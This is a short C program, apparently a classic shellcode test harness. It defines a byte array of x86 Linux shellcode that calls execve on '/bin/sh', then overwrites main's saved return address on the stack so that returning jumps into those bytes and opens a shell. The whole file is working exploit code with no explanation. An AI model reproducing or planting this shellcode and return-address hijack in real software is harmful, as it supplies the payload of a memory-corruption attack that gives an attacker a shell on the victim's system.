int  main(void) {
  int *ret;
  char shellcode[] = { 0xeb, 0x1f, 0x5e, 0x89, 0x76, 0x08, 0x31, 0xc0, 0x88, 0x46, 0x07, 0x89, 0x46, 0x0c, 0xb0, 0x0b, 0x89, 0xf3, 0x8d, 0x4e, 0x08, 0x8d, 0x56, 0x0c, 0xcd, 0x80, 0x31, 0xc0, 0x40, 0x31, 0xdb, 0xcd, 0x80, 0xe8, 0xdc, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68 };
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}
